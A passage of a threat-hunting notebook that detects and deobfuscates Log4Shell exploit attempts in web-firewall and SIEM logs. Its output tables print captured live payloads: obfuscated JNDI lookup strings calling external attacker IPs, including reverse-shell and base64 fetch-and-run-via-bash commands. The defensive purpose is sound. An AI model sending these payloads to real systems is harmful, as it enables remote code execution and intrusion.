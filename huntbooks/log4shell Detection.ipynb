{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ace59e54",
   "metadata": {},
   "source": [
    "# log4shell\n",
    "\n",
    "### References\n",
    "- https://www.lunasec.io/docs/blog/log4j-zero-day/\n",
    "- https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n",
    "\n",
    "Search payloads (`artifact:payload_bin`, which *could* be base64 logs, depending on the data source) for obfuscated log4shell exploit attempts.\n",
    "\n",
    "Exploit attempts involve the attacker inserting special strings into an application (e.g. specially crafter user agent string in an HTTP request) that she knows will be logged.  If that application uses a vulnerable version of log4j, it will attempt to interpret these special strings, leading to the RCE.\n",
    "\n",
    "The strings are of the form `${jndi:ldap://example.com/path}`.  Other schemes besides ldap, such as dns, rmi, etc. can be used as well.  The strings can be obfuscated with other \"property substition\" constructs, like `${lower:J}` which, when evaluated, returns `j`.\n",
    "\n",
    "The detection logic here attempts to pick out strings like `${...}` and parse/interpret them to deobfuscate.  The parser will either give up or return the deobfuscated JNDI string, so you can inspect the target (which might help reduce false positives, or help you collect attack server URIs)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f2772694",
   "metadata": {},
   "source": [
    "## Step 1: collect some data\n",
    "\n",
    "This notebook uses a STIX bundle with real exploit data, hosted on github.  You can replace that URL with your own stix-shifter data source config to search any supported data source.\n",
    "\n",
    "The regular expression used in the STIX pattern, `.*` is perhaps overly broad.  You should tailor it to your environment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "23114819",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>artifact*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>mac-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>x-ibm-finding*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "      <th>x-qradar*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>logs</td>\n",
       "      <td>artifact</td>\n",
       "      <td>10</td>\n",
       "      <td>10</td>\n",
       "      <td>0</td>\n",
       "      <td>30</td>\n",
       "      <td>20</td>\n",
       "      <td>10</td>\n",
       "      <td>10</td>\n",
       "      <td>10</td>\n",
       "      <td>10</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "logs = GET artifact FROM https://raw.githubusercontent.com/opencybersecurityalliance/kestrel-analytics/release/testdata/log4shell_bundle.json\n",
    "    WHERE [artifact:payload_bin MATCHES '.*']"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e6d95672",
   "metadata": {},
   "source": [
    "## Step 2: apply detection logic\n",
    "\n",
    "Now run the \"analytic\" to try and pick out exploit attempts.  It will add an `exploit` attribute to each entity in the `logs` variable.  If an exploit attempt is found in that payload, it will be deobfuscated and added to the entity.\n",
    "\n",
    "It will also add the base64-decoded payload as `original`, and split the exploit URI to `hostname`, `port`, `path`, and `query` string.  Lastly, it does a DNS lookup to convert `hostname` to IP `addr`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "b87945e9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": []
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "APPLY log4shell ON logs"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c9ecef37",
   "metadata": {},
   "source": [
    "## Step 3: filter\n",
    "\n",
    "Now filter the enriched `logs` variable so that only entities with non-NULL `exploit` attributes remain.  Then display those for manual inspection."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "29078d28",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>id</th>\n",
       "      <th>first_observed</th>\n",
       "      <th>addr</th>\n",
       "      <th>exploit</th>\n",
       "      <th>original</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>artifact--1059326b-6737-470d-b04b-060c56001db8_10</td>\n",
       "      <td>2021-12-15T09:28:41.056Z</td>\n",
       "      <td>162.55.90.26</td>\n",
       "      <td>ldap://162.55.90.26/876014912/C</td>\n",
       "      <td>{\"timestamp\":1639560351919,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":{\"ruleId\":\"Log4JRCE\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"157.90.35.190\",\"country\":\"DE\",\"headers\":[{\"name\":\"Host\",\"value\":\"127.0.0.1\"},{\"name\":\"User-Agent\",\"value\":\"\\${jndi:ldap://162.55.90.26/876014912/C}\"},{\"name\":\"Connection\",\"value\":\"Close\"}],\"uri\":\"/\",\"args\":\"\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b9b49f-63d3927e516da57a1b0f8931\"},\"labels\":[{\"name\":\"awswaf:managed:aws:known-bad-inputs:Log4JRCE\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--1c270e5e-8862-4739-a6dd-14f237f746f4_10</td>\n",
       "      <td>2021-12-15T17:25:05.079Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>Dec 15 12:25:04 127.0.0.1  [dylanh@72.185.253.5 (6378) /console/do/ariel/arielDetails] com.q1labs.core.shared.ariel.CustomKeyCreator: [WARN] [NOT:0000004000][172.31.79.90/- -] [-/- -]keyFromString failed. Expression for property Sender Host tried to return \\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback} as class com.q1labs.core.dao.util.Host. Check the custom property definition to ensure it is the proper type.\\n</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--2cd84670-2574-4da6-aa5e-06312fa73cac_10</td>\n",
       "      <td>2021-12-14T21:43:32.567Z</td>\n",
       "      <td>167.99.32.139</td>\n",
       "      <td>ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999</td>\n",
       "      <td>{\"timestamp\":1639517866786,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":{\"ruleId\":\"Log4JRCE\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"157.245.108.125\",\"country\":\"IN\",\"headers\":[{\"name\":\"User-Agent\",\"value\":\"borchuk/3.1 \\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Bearer\",\"value\":\"\\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"},{\"name\":\"Authentication\",\"value\":\"\\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"},{\"name\":\"X-Requested-With\",\"value\":\"\\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"},{\"name\":\"X-Requested-For\",\"value\":\"\\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"},{\"name\":\"X-Api-Version\",\"value\":\"\\${jndi:ldap://167.99.32.139:1389/Basic/ReverseShell/167.99.32.139/9999}\"}],\"uri\":\"/\",\"args\":\"\",\"httpVersion\":\"HTTP/1.0\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b90eaa-50fc7e1501653a652d9a768d\"},\"labels\":[{\"name\":\"awswaf:managed:aws:known-bad-inputs:Log4JRCE\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--31629b2f-2ea6-45b2-8a2c-af55e15ae224_10</td>\n",
       "      <td>2021-12-15T17:28:55.680Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>Dec 15 12:28:55 127.0.0.1  [qw_4:078ef1bc-1d0b-4e67-8223-75bee730368c] com.q1labs.core.shared.ariel.CustomKeyCreator: [WARN] [NOT:0000004000][172.31.79.90/- -] [-/- -]keyFromString failed. Expression for property Sender Host tried to return \\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback} as class com.q1labs.core.dao.util.Host. Check the custom property definition to ensure it is the proper type.\\n</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--5915791-6a3a-4402-925d-78e38deff558_10</td>\n",
       "      <td>2021-12-15T06:05:21.456Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>{\"timestamp\":1639548073714,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesAnonymousIpList\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAmazonIpReputationList\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAnonymousIpList\",\"terminatingRule\":{\"ruleId\":\"HostingProviderIPList\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"143.198.163.225\",\"country\":\"US\",\"headers\":[{\"name\":\"Host\",\"value\":\"52.54.237.64\"},{\"name\":\"User-Agent\",\"value\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"},{\"name\":\"Accept-Encoding\",\"value\":\"gzip, deflate\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Connection\",\"value\":\"keep-alive\"},{\"name\":\"X-Forwarded-For\",\"value\":\"\\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback}\"}],\"uri\":\"/favicon.ico\",\"args\":\"\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b984a9-5301351609d92fe42b211b96\"},\"labels\":[{\"name\":\"awswaf:managed:aws:anonymous-ip-list:HostingProviderIPList\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--5ca8a77d-c592-488f-9278-3e0bb47e9014_10</td>\n",
       "      <td>2021-12-15T09:28:41.056Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>{\"timestamp\":1639560195748,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesAnonymousIpList\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAmazonIpReputationList\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAnonymousIpList\",\"terminatingRule\":{\"ruleId\":\"HostingProviderIPList\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"165.22.196.189\",\"country\":\"NL\",\"headers\":[{\"name\":\"Host\",\"value\":\"52.54.237.64\"},{\"name\":\"User-Agent\",\"value\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"},{\"name\":\"Accept-Encoding\",\"value\":\"gzip, deflate\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Connection\",\"value\":\"keep-alive\"},{\"name\":\"X-Forwarded-For\",\"value\":\"\\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback}\"}],\"uri\":\"/favicon.ico\",\"args\":\"\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b9b403-162daff1157b64656da9b52e\"},\"labels\":[{\"name\":\"awswaf:managed:aws:anonymous-ip-list:HostingProviderIPList\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--5f1d8d0f-af17-410a-b3c6-5a1a06936bf9_10</td>\n",
       "      <td>2021-12-15T06:05:21.456Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>{\"timestamp\":1639548073259,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesAnonymousIpList\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAmazonIpReputationList\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAnonymousIpList\",\"terminatingRule\":{\"ruleId\":\"HostingProviderIPList\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"143.198.163.225\",\"country\":\"US\",\"headers\":[{\"name\":\"Host\",\"value\":\"52.54.237.64\"},{\"name\":\"User-Agent\",\"value\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"},{\"name\":\"Accept-Encoding\",\"value\":\"gzip, deflate\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Connection\",\"value\":\"keep-alive\"},{\"name\":\"X-Forwarded-For\",\"value\":\"\\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback}\"}],\"uri\":\"/\",\"args\":\"\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b984a9-60d5e538182cb28d3e910213\"},\"labels\":[{\"name\":\"awswaf:managed:aws:anonymous-ip-list:HostingProviderIPList\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--821f09d3-3821-4ccc-b920-23dfe5cb6ce2_10</td>\n",
       "      <td>2021-12-15T17:30:32.631Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>Dec 15 12:30:32 127.0.0.1  [dylanh@72.185.253.5 (736) /console/do/ariel/arielDetails] com.q1labs.core.shared.ariel.CustomKeyCreator: [WARN] [NOT:0000004000][172.31.79.90/- -] [-/- -]keyFromString failed. Expression for property Sender Host tried to return \\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback} as class com.q1labs.core.dao.util.Host. Check the custom property definition to ensure it is the proper type.\\n</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--8a105b95-4f51-4649-ab4a-99694e3455ba_10</td>\n",
       "      <td>2021-12-15T09:28:41.056Z</td>\n",
       "      <td>134.209.163.248</td>\n",
       "      <td>ldap://xf.world80.log4j.binaryedge.io:80/callback</td>\n",
       "      <td>{\"timestamp\":1639560195656,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesAnonymousIpList\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAmazonIpReputationList\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesAnonymousIpList\",\"terminatingRule\":{\"ruleId\":\"HostingProviderIPList\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"165.22.196.189\",\"country\":\"NL\",\"headers\":[{\"name\":\"Host\",\"value\":\"52.54.237.64\"},{\"name\":\"User-Agent\",\"value\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\"},{\"name\":\"Accept-Encoding\",\"value\":\"gzip, deflate\"},{\"name\":\"Accept\",\"value\":\"*/*\"},{\"name\":\"Connection\",\"value\":\"keep-alive\"},{\"name\":\"X-Forwarded-For\",\"value\":\"\\${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://xf.world80.log4j.bin\\${upper:a}ryedge.io:80/callback}\"}],\"uri\":\"/\",\"args\":\"\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b9b403-527fa4f62360602574638179\"},\"labels\":[{\"name\":\"awswaf:managed:aws:anonymous-ip-list:HostingProviderIPList\"}]}</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>artifact--f98b3d32-08d7-4790-89ec-c036fb831894_10</td>\n",
       "      <td>2021-12-14T22:05:34.095Z</td>\n",
       "      <td>195.54.160.149</td>\n",
       "      <td>ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo</td>\n",
       "      <td>{\"timestamp\":1639519206404,\"formatVersion\":1,\"webaclId\":\"arn:aws:wafv2:us-east-1:920294754780:regional/webacl/AWS-Test-WAF/cff90920-8de1-458f-a021-813c92c9ab2e\",\"terminatingRuleId\":\"AWS-AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRuleType\":\"MANAGED_RULE_GROUP\",\"action\":\"BLOCK\",\"terminatingRuleMatchDetails\":[],\"httpSourceName\":\"ALB\",\"httpSourceId\":\"920294754780-app/Test-Load-Balancer/ef5a918154bdeb50\",\"ruleGroupList\":[{\"ruleGroupId\":\"AWS#AWSManagedRulesCommonRuleSet\",\"terminatingRule\":null,\"nonTerminatingMatchingRules\":[],\"excludedRules\":null},{\"ruleGroupId\":\"AWS#AWSManagedRulesKnownBadInputsRuleSet\",\"terminatingRule\":{\"ruleId\":\"Log4JRCE\",\"action\":\"BLOCK\",\"ruleMatchDetails\":null},\"nonTerminatingMatchingRules\":[],\"excludedRules\":null}],\"rateBasedRuleList\":[],\"nonTerminatingMatchingRules\":[],\"requestHeadersInserted\":null,\"responseCodeSent\":null,\"httpRequest\":{\"clientIp\":\"195.54.160.149\",\"country\":\"RU\",\"headers\":[{\"name\":\"Host\",\"value\":\"52.54.237.64\"},{\"name\":\"User-Agent\",\"value\":\"\\${\\${::-j}\\${::-n}\\${::-d}\\${::-i}:\\${::-l}\\${::-d}\\${::-a}\\${::-p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo}\"},{\"name\":\"Referer\",\"value\":\"\\${jndi:\\${lower:l}\\${lower:d}\\${lower:a}\\${lower:p}://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo}\"},{\"name\":\"Accept-Encoding\",\"value\":\"gzip\"},{\"name\":\"Connection\",\"value\":\"close\"}],\"uri\":\"/\",\"args\":\"x=\\${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC81Mi41NC4yMzcuNjQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvNTIuNTQuMjM3LjY0OjgwKXxiYXNo}\",\"httpVersion\":\"HTTP/1.1\",\"httpMethod\":\"GET\",\"requestId\":\"1-61b913e6-6c1f91d614cef3e542ed7846\"},\"labels\":[{\"name\":\"awswaf:managed:aws:known-bad-inputs:Log4JRCE\"}]}</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>artifact*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>mac-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>x-ibm-finding*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "      <th>x-qradar*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>susp</td>\n",
       "      <td>artifact</td>\n",
       "      <td>10</td>\n",
       "      <td>10</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "susp = GET artifact FROM logs WHERE [artifact:exploit LIKE '%']\n",
    "DISP susp ATTR id, first_observed, addr, exploit, original"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2ab44ca2",
   "metadata": {},
   "source": [
    "## Step 4: follow-on searches to see if any attacks succeeded\n",
    "\n",
    "If your datasource supports it, you can search for network connections (`network-traffic` in STIX) to any of the `addr` values found above.  We do this with a special \"parameterized\" STIX pattern in Kestrel.\n",
    "\n",
    "*Note:* don't forget to change the `FROM` part of the statement below; you want to point to one of your stix-shifter data source configurations, not our example data STIX bundle."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "6b215d22",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "  </tbody>\n",
       "</table>\n",
       "<div><h4>Block Executed in 1 seconds</h4><table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th>VARIABLE</th>\n",
       "      <th>TYPE</th>\n",
       "      <th>#(ENTITIES)</th>\n",
       "      <th>#(RECORDS)</th>\n",
       "      <th>artifact*</th>\n",
       "      <th>ipv4-addr*</th>\n",
       "      <th>mac-addr*</th>\n",
       "      <th>network-traffic*</th>\n",
       "      <th>x-ibm-finding*</th>\n",
       "      <th>x-oca-event*</th>\n",
       "      <th>x-qradar*</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>conns</td>\n",
       "      <td>network-traffic</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>*Number of related records cached.</p></div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "conns = GET network-traffic\n",
    "        FROM https://raw.githubusercontent.com/opencybersecurityalliance/kestrel-analytics/release/testdata/log4shell_bundle.json\n",
    "        WHERE [network-traffic:dst_ref.value = susp.addr]\n",
    "DISP conns"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2aa7ae63",
   "metadata": {},
   "source": [
    "## Alternative searches\n",
    "\n",
